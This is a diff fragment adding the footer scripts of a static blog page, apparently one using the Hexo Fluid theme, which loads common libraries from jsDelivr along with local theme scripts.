+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
